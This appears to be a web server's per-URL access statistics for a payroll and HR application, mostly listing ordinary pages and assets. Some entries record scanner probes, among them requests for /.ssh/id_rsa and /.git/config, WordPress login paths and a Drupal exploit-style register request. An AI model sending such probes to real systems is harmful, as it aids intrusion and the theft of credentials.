1	147	0	0	0	25966992	0	0	24745759	0	0	444135	/plugins/jquery-migrate.min.js
1	1	0	0	0	25429357	0	0	25429357	0	0	320	/img/portlet-config-icon-white.png
1	2	0	0	0	25200903	0	0	25022123	0	0	35844	/loans/07-2017
1	1	0	0	0	24859595	0	0	24859595	0	0	3589	/payroll/204
1	54	0	0	0	25966991	0	0	24745766	0	0	578708	/plugins/moment.min.js
1	1	0	0	0	24830717	0	0	24830717	0	0	3718	/employee-deductions/1/edit
1	0	0	1	0	0	24938568	0	0	24938568	0	0	/finalize-payroll?date=2017-04-30
1	48	0	0	0	25671502	0	0	24804712	0	0	52546	/plugins/datatables/media/images/sort_asc.png
1	150	0	0	0	25966992	0	0	24745759	0	0	1269639	/css/plugins.css
1	0	0	2	0	0	25455882	0	0	25412416	0	0	/contracts?159.89.188.122
1	0	0	1	0	0	25455883	0	0	25455883	0	0	/finalize-payroll?date=2018-04-30
1	4	0	0	0	24855893	0	0	24855893	0	0	212	/63E6117A69F5E5FD0341C7EE83434CB6.txt
1	1	0	0	0	24850681	0	0	24850681	0	0	3597	/payroll/165
1	5	0	1	0	24850680	24850681	0	24849680	24850681	0	17964	/payroll/164
1	1	0	0	0	24830915	0	0	24830915	0	0	5040	/shifts/create
1	6	0	0	0	25022088	0	0	24981930	0	0	27743	/payroll/0?sub=6-2017&main=Branches
1	0	0	0	1	0	0	24849546	0	0	24849546	0	/employee-deductions?196.207.135.93
1	201	0	0	0	25966992	0	0	24745759	0	0	3936834	/plugins/bootstrap/css/bootstrap.min.css
1	46	0	0	0	24888362	0	0	24836687	0	0	206723	/payroll/0?sub=3-2017&main=Branches
1	457	0	0	0	25966992	0	0	24745759	0	0	0	/favicon.ico
1	0	0	1	0	0	25259755	0	0	25259755	0	0	/delete-payroll?date=2018-01-31
1	2	0	0	0	24992115	0	0	24981931	0	0	7105	/payroll/0?all=true&sub=6-2017&main=Branches
1	0	0	25	0	0	25671512	0	0	24804836	0	0	/logout
1	0	0	1	0	0	24992087	0	0	24992087	0	0	/worked/4
1	0	0	1	0	0	24992087	0	0	24992087	0	0	/worked/3
1	10	0	0	0	25022162	0	0	24992082	0	0	48479	/worked/2017
1	0	0	2	0	0	24992087	0	0	24836702	0	0	/worked/2
1	1	0	0	0	25459884	0	0	25459884	0	0	53759	/employee-allowances/create?allowanceId=22
1	3	0	0	0	24830617	0	0	24830615	0	0	14080	/payment-methods/1/edit
1	17	0	0	0	24886809	0	0	24836687	0	0	60349	/payroll/0?all=true&sub=3-2017&main=Branches
1	0	0	2	0	0	24992087	0	0	24836702	0	0	/worked/1
1	1	0	0	0	24849558	0	0	24849558	0	0	17531	/payroll-pdf/64
1	1	0	0	0	24889681	0	0	24889681	0	0	5342	/employee-allowances/create?allowanceId=21
1	1	0	0	0	24849629	0	0	24849629	0	0	3577	/payroll/118
1	4	0	0	0	25074773	0	0	25074773	0	0	322	/.well-known/pki-validation/532318188F0A10A9C5337649AF9E8C16.txt
1	1	0	0	0	24849625	0	0	24849625	0	0	3588	/payroll/117
1	1	0	0	0	25429357	0	0	25429357	0	0	239	/img/portlet-expand-icon-white.png
1	1	0	0	0	24830635	0	0	24830635	0	0	4807	/employee-deductions/create?deduction=4
1	0	0	1	0	0	25022107	0	0	25022107	0	0	/contracts/9
1	0	0	8	0	0	25543280	0	0	24830687	0	0	/contracts/8
1	0	0	5	0	0	25587979	0	0	24938583	0	0	/contracts/7
1	1	0	0	0	24849524	0	0	24849524	0	0	19057	/payroll-pdf/50
1	0	0	2	0	0	24992015	0	0	24847917	0	0	/contracts/5
1	2	0	0	0	25429357	0	0	24836676	0	0	56244	/plugins/simple-line-icons/fonts/Simple-Line-Icons.ttf
1	0	0	0	5	0	0	25711620	0	0	25711620	0	/.ssh/id_rsa
1	0	0	1	0	0	24889665	0	0	24889665	0	0	/contracts/4
1	1	0	0	0	24849627	0	0	24849627	0	0	3588	/payroll/108
1	3	0	1	0	24830677	24830677	0	24830672	24830677	0	10689	/payroll/9
1	0	0	2	0	0	24836666	0	0	24830671	0	0	/payroll/8
1	1	0	3	0	24830714	25671503	0	24830714	24830634	0	3693	/contracts/1
1	0	0	1	0	0	24830671	0	0	24830671	0	0	/payroll/7
1	0	0	1	0	0	24830671	0	0	24830671	0	0	/payroll/6
1	0	0	1	0	0	24830671	0	0	24830671	0	0	/payroll/5
1	1	0	0	0	25429357	0	0	25429357	0	0	45404	/plugins/bootstrap/fonts/glyphicons-halflings-regular.ttf
1	0	0	1	0	0	24830671	0	0	24830671	0	0	/payroll/4
1	1	0	0	0	24849521	0	0	24849521	0	0	19764	/payroll-pdf/41
1	3	0	0	0	24804837	0	0	24745766	0	0	4572	/images/smalllogo.jpg
1	0	0	2	0	0	24847935	0	0	24830671	0	0	/payroll/3
1	0	0	2	0	0	24847935	0	0	24830667	0	0	/payroll/2
1	6	0	2	0	24836692	24847935	0	24804888	24830648	0	25915	/payroll/1
1	0	0	1	0	0	24804860	0	0	24804860	0	0	/departments?type=branch
1	1	0	0	0	24830915	0	0	24830915	0	0	4111	/work-plans/create
1	1	0	0	0	24849512	0	0	24849512	0	0	19764	/payroll-pdf/32
1	1	0	0	0	24830821	0	0	24830821	0	0	17515	/payroll-pdf/31
1	1	0	0	0	24830819	0	0	24830819	0	0	17515	/payroll-pdf/24
1	2	0	0	0	24849507	0	0	24830689	0	0	36853	/payroll-pdf/23
1	3	0	0	0	24830771	0	0	24830686	0	0	51243	/payroll-pdf/22
1	1	0	0	0	24847954	0	0	24847954	0	0	19764	/payroll-pdf/19
1	3	0	0	0	24847956	0	0	24830688	0	0	56617	/payroll-pdf/20
1	126	0	0	0	25966992	0	0	24745759	0	0	174964	/plugins/bootstrap-switch/css/bootstrap-switch.min.css
1	1	0	0	0	24847947	0	0	24847947	0	0	18223	/payroll-pdf/18
1	1	0	0	0	24830684	0	0	24830684	0	0	17080	/payroll-pdf/17
1	52	0	0	0	25966991	0	0	24804712	0	0	13260	/img/portlet-remove-icon-white.png
1	4	0	0	0	24836685	0	0	24830680	0	0	70608	/payroll-pdf/15
1	1	0	0	0	24830674	0	0	24830674	0	0	17787	/payroll-pdf/14
1	2	0	0	0	24938581	0	0	24836701	0	0	36452	/payroll-pdf/13
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/xmlrpc.php?rsd
1	1	0	0	0	24830675	0	0	24830675	0	0	17785	/payroll-pdf/12
1	1	0	0	0	24836698	0	0	24836698	0	0	4908	/policies/7/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	3116	/img/social/pintrest.png
1	0	0	3	0	0	24991992	0	0	24938576	0	0	/employees/8
1	1	0	0	0	24830675	0	0	24830675	0	0	17785	/payroll-pdf/10
1	2	0	0	0	24992063	0	0	24830921	0	0	18594	/deductions/2/edit
1	2	0	0	0	24938591	0	0	24938591	0	0	9614	/employees/5
1	1	0	0	0	24830632	0	0	24830632	0	0	4510	/employees/4
1	0	0	1	0	0	24830627	0	0	24830627	0	0	/employees/3
1	0	0	1	0	0	24830621	0	0	24830621	0	0	/employees/2
1	1	0	0	0	25429357	0	0	25429357	0	0	3055	/img/social/twitter.png
1	7	0	3	0	24847901	24830634	0	24830632	24830611	0	31962	/employees/1
1	1	0	0	0	24889663	0	0	24889663	0	0	3694	/worked/15/edit
1	4	0	0	0	25512608	0	0	25512608	0	0	320	/.well-known/pki-validation/6CA18185EB81C6A24E0C63C001FF778A.txt
1	1	0	0	0	24830918	0	0	24830918	0	0	3507	/holidays
1	0	0	0	5	0	0	25719055	0	0	25719055	0	/wp-login.php
1	54	0	0	0	25966991	0	0	24745766	0	0	126888	/plugins/fullcalendar/fullcalendar.min.css
1	1	0	0	0	25429357	0	0	25429357	0	0	324	/img/portlet-reload-icon-white.png
1	1	0	0	0	25429357	0	0	25429357	0	0	59973	/plugins/simple-line-icons/fonts/Simple-Line-Icons.svg
1	1	0	0	0	25429357	0	0	25429357	0	0	26838	/plugins/bootstrap/fonts/glyphicons-halflings-regular.svg
1	54	0	0	0	25966991	0	0	24745766	0	0	69264	/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.css
1	9	0	0	0	25556457	0	0	25409763	0	0	394856	/payroll/0?sub=3-2018
1	54	0	0	0	25966991	0	0	24745766	0	0	139740	/plugins/bootstrap-datepicker/css/bootstrap-datepicker3.min.css
1	43	0	0	0	24888392	0	0	24836688	0	0	188817	/payroll/0?sub=3-2017
1	54	0	0	0	25966991	0	0	24745766	0	0	71084	/plugins/bootstrap-daterangepicker/daterangepicker-bs3.css
1	4	0	0	0	24938593	0	0	24889684	0	0	28012	/allowances/21/edit
1	4	0	0	0	24836697	0	0	24836697	0	0	14714	/units-made
1	10	0	0	0	25610957	0	0	25536396	0	0	404005	/payroll/0?sub=6-2018
1	3	0	0	0	25022166	0	0	24992016	0	0	13527	/payroll/0?sub=6-2017
1	1	0	0	0	25184008	0	0	25184008	0	0	77	/.well-known/pki-validation/A9574962046CB214C06C74D6F00E5C5F.txt
1	2	0	0	0	24830917	0	0	24804861	0	0	1740	/departments/1?type=branch
1	1	0	0	0	25671508	0	0	25671508	0	0	33750	/payroll/0?sub=9-2018
1	4	0	0	0	25543280	0	0	24992113	0	0	116818	/contracts/10/edit
1	0	0	1	0	0	24836698	0	0	24836698	0	0	/policies/7
1	0	0	9	0	0	25671508	0	0	24830649	0	0	/policies/6
1	1	0	1	0	24849511	24849511	0	24849511	24849511	0	4856	/policies/5
1	120	0	0	0	25966992	0	0	24745759	0	0	984828	/scripts/metronic.js
1	0	0	1	0	0	25543269	0	0	25543269	0	0	/employees?159.89.188.122
1	1	0	0	0	24804872	0	0	24804872	0	0	3794	/payment-structures/create
1	1	0	0	0	25429357	0	0	25429357	0	0	949	/plugins/select2/select2x2.png
1	6	0	2	0	25968487	25926630	0	25925534	25916913	0	144	/robots.txt?165.227.75.29
1	0	0	1	0	0	25634116	0	0	25634116	0	0	/finalize-payroll?date=2018-08-31
1	4	0	0	0	25671502	0	0	24938609	0	0	85192	/contracts/16/edit
1	1	0	0	0	24855893	0	0	24855893	0	0	64	/1E4F6C4077F82024EB25720B2C31C2E1.txt?196.207.135.93
1	1	0	0	0	25429357	0	0	25429357	0	0	94226	/plugins/font-awesome/fonts/fontawesome-webfont.svg?v=4.3.0
1	3	0	0	0	25429357	0	0	24831937	0	0	579	/img/remove-icon-small.png
1	2	0	0	0	25588037	0	0	25409564	0	0	74413	/contracts/19/edit
1	1	0	0	0	25409571	0	0	25409571	0	0	37297	/contracts/20/edit
1	1	0	0	0	25610965	0	0	25610965	0	0	37301	/contracts/23/edit
1	0	0	3	0	0	24938608	0	0	24938586	0	0	/delete-payroll?date=2017-05-31
1	1	0	0	0	24855893	0	0	24855893	0	0	64	/40F9C2354F83F8DD4335E85C9AE18E70.txt
1	1	0	0	0	25475610	0	0	25475610	0	0	37118	/contracts/26/edit
1	9	0	0	0	25966992	0	0	24830659	0	0	996723	/_debugbar/assets/stylesheets?v=1473948356
1	53	0	0	0	25966991	0	0	24745766	0	0	1337373	/plugins/datatables/media/js/jquery.dataTables.min.js
1	0	0	10	1	0	25643637	25628882	0	25372127	25628882	0	/?159.89.188.122
1	140	0	1	0	25671508	24804894	0	24804886	24804894	0	1542881	/payroll/create
1	2	0	0	0	25409561	0	0	24938591	0	0	38039	/employees/5/edit
1	1	0	0	0	25402888	0	0	25402888	0	0	64	/.well-known/pki-validation/2EE197A7D26F3D9278E63F0F9DB060B5.txt
1	0	0	0	1	0	0	25666681	0	0	25666681	0	/wp/wp-login.php
1	195	0	109	0	25966992	25966991	0	24745758	24745759	0	938566	/login
1	10	0	1	0	25022102	24804873	0	24804871	24804873	0	37081	/payment-structures
1	54	0	0	0	25966991	0	0	24745766	0	0	35724	/plugins/bootstrap-hover-dropdown/bootstrap-hover-dropdown.min.js
1	5	0	0	0	24991991	0	0	24938571	0	0	21892	/employees/8/edit
1	4	0	0	0	24847885	0	0	24804874	0	0	15013	/employee-types/create
1	4	0	0	0	25409576	0	0	24847886	0	0	90526	/contracts/create
1	61	0	0	0	25966992	0	0	24745759	0	0	338550	/img/syncfusion-icons-white.png
1	2	0	0	0	24868070	0	0	24836219	0	0	3297	/login?196.207.135.93
1	1	0	0	0	25429357	0	0	25429357	0	0	3403	/img/social/dropbox.png
1	56	0	0	0	25966991	0	0	24745766	0	0	399514	/plugins/jquery-ui/jquery-ui.min.css
1	30	0	0	0	25671509	0	0	24804712	0	0	954450	/plugins/uniform/images/sprite.png
1	0	0	1	0	0	24836661	0	0	24836661	0	0	/users/4
1	3	0	0	0	24849567	0	0	24836701	0	0	11625	/worked/03-2017
1	0	0	1	0	0	24836661	0	0	24836661	0	0	/users/3
1	0	0	1	0	0	24830582	0	0	24830582	0	0	/employee-deductions/4
1	12	0	0	0	24992110	0	0	24992011	0	0	48721	/worked/06-2017
1	0	0	0	1	0	0	25666681	0	0	25666681	0	/blog/wp-login.php
1	0	0	2	0	0	24849587	0	0	24849523	0	0	/loans/2
1	9	0	0	0	24855134	0	0	24836689	0	0	31732	/payroll/0?all=true&sub=3-2017
1	0	0	5	0	0	24849586	0	0	24849533	0	0	/loans/1
1	142	0	30	0	25412431	25412431	0	24804874	24804883	0	1883420	/employees
1	1	0	0	0	25429357	0	0	25429357	0	0	3248	/img/social/dribbble.png
1	54	0	0	0	25966991	0	0	24745766	0	0	105872	/plugins/jquery-slimscroll/jquery.slimscroll.min.js
1	1	0	0	0	24804861	0	0	24804861	0	0	800	/departments/1/edit
1	4	0	0	0	25402888	0	0	25402888	0	0	320	/.well-known/pki-validation/4E1493D3D77BA8209A848DD75E56A8DD.txt
1	1	0	0	0	24830617	0	0	24830617	0	0	5265	/contracts/3/edit
1	1	0	0	0	24965333	0	0	24965333	0	0	53	/2870D16B5A67C19A49FC18EEF844C049.txt
1	0	0	1	0	0	25022123	0	0	25022123	0	0	/advances/3
1	1	0	0	0	25022107	0	0	25022107	0	0	5307	/contracts/9/edit
1	0	0	1	0	0	24992081	0	0	24992081	0	0	/advances/2
1	0	0	1	0	0	25022109	0	0	25022109	0	0	/advances/1
1	0	0	2	0	0	25501539	0	0	25459878	0	0	/payroll?165.227.75.29
1	0	0	2	0	0	24748739	0	0	24746051	0	0	/?197.248.207.206
1	95	0	0	0	25966992	0	0	24745759	0	0	5223760	/plugins/font-awesome/fonts/fontawesome-webfont.woff2?v=4.3.0
1	22	0	3	1	24992084	24804871	24830616	24804866	24804870	24830616	82271	/payment-methods
1	55	0	0	0	25966991	0	0	24745766	0	0	690060	/plugins/jquery.sparkline.min.js
1	4	0	0	0	25459883	0	0	24804862	0	0	72839	/allowances/create
1	1	0	0	0	24849533	0	0	24849533	0	0	4004	/employees/12/edit
1	62	0	0	0	25966992	0	0	24745759	0	0	421910	/plugins/jquery-validation/js/jquery.validate.min.js
1	0	0	1	0	0	24804862	0	0	24804862	0	0	/departments/1
1	0	0	1	33	0	24830635	24898348	0	24830635	24830717	0	/employee-deductions
1	1	0	0	0	24836702	0	0	24836702	0	0	3693	/worked/2/edit
1	1	0	0	0	25512608	0	0	25512608	0	0	77	/.well-known/pki-validation/3A53B9641AFDCF2C741BB8794626AD21.txt
1	11	0	1	0	25967843	25949368	0	25658978	25949368	0	264	/robots.txt
1	1	0	0	0	25074773	0	0	25074773	0	0	64	/.well-known/pki-validation/BDF0B9B162206B3B046AB96D38F9E289.txt
1	1	0	0	0	25429357	0	0	25429357	0	0	21018	/plugins/simple-line-icons/fonts/Simple-Line-Icons.eot
1	0	0	1	0	0	24981928	0	0	24981928	0	0	/finalize-payroll?date=2017-05-31
1	1	0	0	0	25429357	0	0	25429357	0	0	20050	/plugins/bootstrap/fonts/glyphicons-halflings-regular.eot
1	1	0	0	0	24849534	0	0	24849534	0	0	3726	/employee-deductions/47/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	3108	/img/social/forrst.png
1	0	0	37	1	0	25966991	25778554	0	25200901	25778554	0	/?165.227.75.29
1	1	0	0	0	24849575	0	0	24849575	0	0	3753	/employee-deductions/54/edit
1	0	0	1	0	0	25501543	0	0	25501543	0	0	/finalize-payroll?date=2018-05-31
1	53	0	0	0	25966991	0	0	24745766	0	0	156468	/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.js
1	0	0	1	0	0	24992087	0	0	24992087	0	0	/worked/61
1	1	0	0	0	25402888	0	0	25402888	0	0	77	/.well-known/pki-validation/59845E4A956204EA710775D81AA73160.txt
1	3	0	2	0	25561013	25561013	0	24745766	24745766	0	62689	/user-profile
1	1	0	0	0	24848131	0	0	24848131	0	0	9090	/payroll-print?196.207.135.93
1	0	0	1	0	0	24992088	0	0	24992088	0	0	/worked/49
1	0	0	1	0	0	24992087	0	0	24992087	0	0	/worked/48
1	0	0	1	0	0	24992085	0	0	24992085	0	0	/worked/47
1	0	0	0	1	0	0	25913630	0	0	25913630	0	/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax
1	1	0	0	0	25429357	0	0	25429357	0	0	60744	/plugins/font-awesome/fonts/fontawesome-webfont.eot?v=4.3.0
1	1	0	0	0	25429357	0	0	25429357	0	0	143	/plugins/uniform/images/bg-input-focus.png
1	5	0	0	0	25022120	0	0	24849531	0	0	26213	/loans/1/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	1236	/img/social/googleplus.png
1	1	0	0	0	25293448	0	0	25293448	0	0	77	/.well-known/pki-validation/2676942CFCC8D704DA26063063656F11.txt
1	5	0	0	0	24938583	0	0	24849501	0	0	17713	/payroll/0?all=true&main=Branches
1	1	0	0	0	24830717	0	0	24830717	0	0	3714	/employee-deductions/2/edit
1	1	0	0	0	25429357	0	0	25429357	0	0	1849	/img/input-spinner.gif
1	4	0	0	0	25459889	0	0	25459884	0	0	135039	/allowances/22
1	1	0	0	0	25731488	0	0	25731488	0	0	64	/.well-known/pki-validation/29796E967CD55266FAC98ADBB7FC69FD.txt?165.227.75.29
1	12	0	2	0	24938673	24938593	0	24889681	24889685	0	49450	/allowances/21
1	142	0	0	0	25966992	0	0	24745759	0	0	25620	/admin/layout4/css/custom.css
1	1	0	0	0	24830633	0	0	24830633	0	0	4307	/employee-payment-methods/1/edit
1	1	0	0	0	24855893	0	0	24855893	0	0	53	/054FE284B4724AFF88C6A3514A150C13.txt
1	1	0	0	0	24830632	0	0	24830632	0	0	4318	/employee-payment-methods/4/edit
1	1	0	0	0	24939007	0	0	24939007	0	0	5895	/users/5/edit
1	11	0	0	0	25588079	0	0	24836673	0	0	63622	/hours-worked
1	0	0	1	0	0	24889664	0	0	24889664	0	0	/worked/15
1	0	0	0	1	0	0	25913632	0	0	25913632	0	/administrator/webconfig.txt.php
1	148	0	0	0	25966992	0	0	24745759	0	0	85702	/css/style.css
1	18	0	4	0	24855074	24889666	0	24830582	24830685	0	87741	/deductions/4
1	5	0	3	0	24868071	24830917	0	24830646	24830647	0	25632	/deductions/3
1	1	0	0	0	24830716	0	0	24830716	0	0	5240	/deductions/2
1	9	0	4	0	24898172	25409557	0	24804885	24806006	0	46032	/deductions/1
1	6	0	0	0	24981928	0	0	24938586	0	0	27112	/payroll/0?sub=5-2017&main=Branches
1	1	0	0	0	25429357	0	0	25429357	0	0	3095	/img/social/evernote.png
1	7	0	0	0	25723633	0	0	25258569	0	0	47334	/login?165.227.75.29
1	4	0	0	0	25184008	0	0	25184008	0	0	318	/.well-known/pki-validation/BA6C0DB3BBF373B1CBB918E5DF758CD5.txt
1	3	0	0	0	24847913	0	0	24836688	0	0	12340	/payroll/0?sub=2-2017&main=Branches
1	106	0	15	0	25671507	25634118	0	24804887	24804887	0	929987	/worked
1	3	0	0	0	25022187	0	0	25022170	0	0	177280	/payroll-pdfs?all=true&sub=7-2017&main=Branches&main=Branches
1	2	0	0	0	24938599	0	0	24938588	0	0	7106	/payroll/0?all=true&sub=5-2017&main=Branches
1	0	0	0	1	0	0	25913165	0	0	25913165	0	/login/wp-includes/wlwmanifest.xml
1	70	0	0	0	25966992	0	0	24745759	0	0	63000	/admin/pages/css/login3.css
1	1	0	0	0	25184008	0	0	25184008	0	0	64	/.well-known/pki-validation/72CC0BA56CAC9BB6DAF7ED09511FE6FE.txt
1	2	0	0	0	24830863	0	0	24804864	0	0	11948	/deductions/create
1	1	0	0	0	25429357	0	0	25429357	0	0	3241	/img/social/skype.png
1	1	0	0	0	24836701	0	0	24836701	0	0	3553	/payroll/0?all=true&sub=2-2017&main=Branches
1	2	0	0	0	24804876	0	0	24804873	0	0	13322	/grades/create
1	201	0	0	0	25966992	0	0	24745759	0	0	427878	/plugins/simple-line-icons/simple-line-icons.min.css
1	2	0	0	0	24847943	0	0	24836708	0	0	108	/template
1	53	0	0	0	25966991	0	0	24745766	0	0	73542	/plugins/bootstrap-toastr/toastr.min.js
1	4	0	0	0	25022109	0	0	24889665	0	0	15270	/advances/04-2017
1	2	0	0	0	25022123	0	0	24992081	0	0	7640	/advances/07-2017
1	1	0	0	0	25293448	0	0	25293448	0	0	64	/.well-known/pki-validation/203F4814A7CBB822D7230BBF5FB22883.txt?159.89.188.122
1	1	0	0	0	25429357	0	0	25429357	0	0	3076	/img/social/jolicloud.png
1	3	0	0	2	24886808	0	24836688	24847913	0	24836687	138879	/payroll-pdfs?all=true&sub=3-2017&main=Branches&main=Branches
1	55	0	0	0	25966991	0	0	24745766	0	0	31148	/admin/pages/css/tasks.css
1	119	0	0	0	25966992	0	0	24745759	0	0	2141217	/plugins/select2/select2.min.js
1	0	0	2	4	0	25459884	24938597	0	24889681	24938597	0	/employee-allowances
1	62	0	0	0	25966992	0	0	24745759	0	0	88536	/admin/pages/scripts/login.js
1	4	0	0	0	25731488	0	0	25731488	0	0	320	/.well-known/pki-validation/D4E5F2C33E35E30E6C813DEEFA482B1E.txt
1	34	0	0	0	25671508	0	0	24804839	0	0	546176	/policies
1	1	0	0	0	25429357	0	0	25429357	0	0	21018	/plugins/simple-line-icons/fonts/Simple-Line-Icons.eot?
1	1	0	0	0	25074773	0	0	25074773	0	0	64	/.well-known/pki-validation/9437A014BD0D96F295C5BD762D722D86.txt?196.207.135.93
1	0	0	1	0	0	24836683	0	0	24836683	0	0	/finalize-payroll?date=2017-02-28
1	4	0	0	0	24849511	0	0	24849511	0	0	19640	/policies/5/edit
1	9	0	1	0	24992062	24804877	0	24804873	24804877	0	33523	/grades
1	7	0	0	0	25966991	0	0	24836682	0	0	51200	/tax?type=p9
1	3	0	0	0	24830917	0	0	24830646	0	0	22642	/deductions/3/edit
1	9	0	0	0	24847955	0	0	24836674	0	0	37379	/payroll/0?main=Branches&sub=2-2017
1	4	0	0	0	25293448	0	0	25293448	0	0	320	/.well-known/pki-validation/52CDE55E4A4BA12B18D621DB0FB254B4.txt
1	0	0	1	0	0	25671509	0	0	25671509	0	0	/finalize-payroll?date=2018-09-30
1	2	0	0	0	24830674	0	0	24830673	0	0	34162	/payroll-pdf/9
1	0	0	3	0	0	24992114	0	0	24992016	0	0	/delete-payroll?date=2017-06-30
1	4	0	0	0	24836685	0	0	24804888	0	0	85321	/payroll-pdf/1
1	2	0	0	0	25259755	0	0	25259755	0	0	61914	/payroll/0?sub=1-2018
1	40	0	0	0	25412428	0	0	24804874	0	0	884838	/employees/create
1	7	0	0	0	25556458	0	0	25412422	0	0	314923	/payroll/0?sub=4-2018
1	1	0	0	0	25429357	0	0	25429357	0	0	3119	/img/social/picasa.png
1	1	0	0	0	25429357	0	0	25429357	0	0	20050	/plugins/bootstrap/fonts/glyphicons-halflings-regular.eot?
1	8	0	0	0	25610960	0	0	25556460	0	0	306708	/payroll/0?sub=7-2018
1	4	0	0	0	25259744	0	0	25022166	0	0	57601	/payroll/0?sub=7-2017
1	1	0	0	0	25588087	0	0	25588087	0	0	19137	/payroll-pdf/487
1	1	0	0	0	25588087	0	0	25588087	0	0	18442	/payroll-pdf/486
1	1	0	0	0	25588087	0	0	25588087	0	0	18433	/payroll-pdf/485
1	1	0	0	0	25588088	0	0	25588088	0	0	18419	/payroll-pdf/484
1	8	0	2	0	24992110	24830581	0	24804837	24804838	0	32780	/profile
1	1	0	0	0	25588086	0	0	25588086	0	0	18423	/payroll-pdf/482
1	1	0	0	0	25588088	0	0	25588088	0	0	17738	/payroll-pdf/481
1	1	0	0	0	25588088	0	0	25588088	0	0	17738	/payroll-pdf/480
1	8	0	0	0	25966991	0	0	24888392	0	0	537099	/tax/p9
1	1	0	0	0	25429357	0	0	25429357	0	0	3025	/img/social/tumblr.png
1	2	0	0	0	25409564	0	0	25022108	0	0	42603	/contracts/11/edit
1	53	0	0	0	25966991	0	0	24745766	0	0	80274	/js/scripts.js
1	1	0	0	0	25556460	0	0	25556460	0	0	18431	/payroll-pdf/472
1	1	0	0	0	25429357	0	0	25429357	0	0	71508	/plugins/font-awesome/fonts/fontawesome-webfont.woff?v=4.3.0
1	2	0	0	0	25459891	0	0	25409566	0	0	74413	/contracts/14/edit
1	57	0	0	0	25966991	0	0	24745766	0	0	64044	/plugins/bootstrap-modal/css/bootstrap-modal.css
1	0	0	0	4	0	0	25711187	0	0	25711187	0	/.git/config
1	1	0	0	0	25429357	0	0	25429357	0	0	3320	/img/social/last-fm.png
1	2	0	0	0	25610967	0	0	25409565	0	0	74604	/contracts/17/edit
1	150	0	0	0	25966992	0	0	24745759	0	0	1442260	/plugins/bootstrap/js/bootstrap.min.js
1	1	0	0	0	25556459	0	0	25556459	0	0	18431	/payroll-pdf/461
1	2	0	0	0	25536397	0	0	25536397	0	0	35470	/payroll-pdf/458
1	0	0	2	0	0	25610966	0	0	25455888	0	0	/contracts/28
1	1	0	0	0	25610957	0	0	25610957	0	0	17757	/payroll-pdf/457
1	0	0	3	0	0	25412426	0	0	25412418	0	0	/contracts/27
1	0	0	1	0	0	25475611	0	0	25475611	0	0	/contracts/26
1	3	0	0	0	25455884	0	0	25409572	0	0	111930	/contracts/21/edit
1	2	0	0	0	25471591	0	0	25471591	0	0	35470	/payroll-pdf/455
1	0	0	1	0	0	25455885	0	0	25455885	0	0	/contracts/25
1	1	0	0	0	25429357	0	0	25429357	0	0	3300	/img/social/amazon.png
1	4	0	0	0	25459902	0	0	25459893	0	0	70936	/payroll-pdf/454
1	0	0	1	0	0	25610962	0	0	25610962	0	0	/contracts/24
1	2	0	0	0	25459890	0	0	25459890	0	0	38274	/payroll-pdf/453
1	0	0	1	0	0	25610965	0	0	25610965	0	0	/contracts/23
1	2	0	0	0	25459886	0	0	25459886	0	0	38274	/payroll-pdf/452
1	0	0	4	0	0	25610966	0	0	25409678	0	0	/contracts/22
1	134	0	0	0	25966992	0	0	24745759	0	0	400620	/plugins/uniform/jquery.uniform.min.js
1	0	0	2	0	0	25455884	0	0	25409572	0	0	/contracts/21
1	2	0	0	0	25610962	0	0	25610957	0	0	74608	/contracts/24/edit
1	0	0	2	0	0	25588037	0	0	25409564	0	0	/contracts/19
1	0	0	1	0	0	25409572	0	0	25409572	0	0	/contracts/20
1	0	0	2	0	0	25610962	0	0	25409568	0	0	/contracts/18
1	0	0	2	0	0	25610967	0	0	25409566	0	0	/contracts/17
1	0	0	0	1	0	0	25665578	0	0	25665578	0	/.DS_Store?165.227.75.29
1	0	0	1	0	0	24938609	0	0	24938609	0	0	/contracts/16
1	4	0	0	0	25412426	0	0	25412417	0	0	149232	/contracts/27/edit
1	0	0	2	0	0	25459892	0	0	25409569	0	0	/contracts/15
1	0	0	2	0	0	25459892	0	0	25409567	0	0	/contracts/14
1	0	0	11	0	0	24836697	0	0	24836673	0	0	/hours-worked/create
1	1	0	0	0	25556458	0	0	25556458	0	0	18431	/payroll-pdf/443
1	0	0	2	0	0	25409565	0	0	25022108	0	0	/contracts/11
1	1	0	0	0	24965333	0	0	24965333	0	0	64	/B1B1D391333818B50D2AD0DED917BA53.txt?154.70.33.249
1	0	0	4	0	0	25543280	0	0	24992114	0	0	/contracts/10
1	1	0	0	0	24849558	0	0	24849558	0	0	3588	/payroll/64
1	0	0	0	1	0	0	25705466	0	0	25705466	0	/scripts/cfformhistory.cfm?165.227.75.29
1	68	0	0	0	25022187	0	0	24836687	0	0	317261	/payroll/0?main=Branches
1	64	0	0	0	25966992	0	0	24745759	0	0	131712	/plugins/respond.min.js
1	0	0	1	0	0	24939006	0	0	24939006	0	0	/users?154.70.33.249
1	1	0	0	0	25429357	0	0	25429357	0	0	143	/plugins/uniform/images/bg-input.png
1	18	0	4	0	25022123	25022109	0	24889660	24889661	0	66074	/advances
1	1	0	0	0	25556457	0	0	25556457	0	0	18431	/payroll-pdf/425
1	54	0	0	0	25966991	0	0	24745766	0	0	3310892	/plugins/jquery-ui/jquery-ui.min.js
1	151	0	0	0	25966992	0	0	24745759	0	0	362748	/admin/layout4/css/themes/default.css
1	6	0	1	0	24992083	24830915	0	24804839	24830915	0	21955	/shifts
1	2	0	0	0	25435703	0	0	25435703	0	0	35514	/payroll-pdf/419
1	1	0	0	0	24849524	0	0	24849524	0	0	3592	/payroll/50
1	1	0	0	0	24992062	0	0	24992062	0	0	3854	/payment-structures/1/edit
1	61	0	0	0	25671509	0	0	24836707	0	0	617301	/payroll-report
1	0	0	4	0	0	24836697	0	0	24836697	0	0	/units-made/create
1	5	0	0	0	25022109	0	0	24889660	0	0	20620	/advances/create
1	8	0	0	0	24981928	0	0	24830650	0	0	28111	/payroll/0?all=true
1	1	0	0	0	24849520	0	0	24849520	0	0	3592	/payroll/41
1	4	0	0	0	25412426	0	0	25412418	0	0	185660	/worked/04-2018
1	2	0	0	0	24889683	0	0	24889663	0	0	8042	/worked/04-2017
1	17	0	0	0	25022179	0	0	24992084	0	0	68936	/worked/07-2017
1	1	0	0	0	24849512	0	0	24849512	0	0	3591	/payroll/32
1	1	0	0	0	24830821	0	0	24830821	0	0	3563	/payroll/31
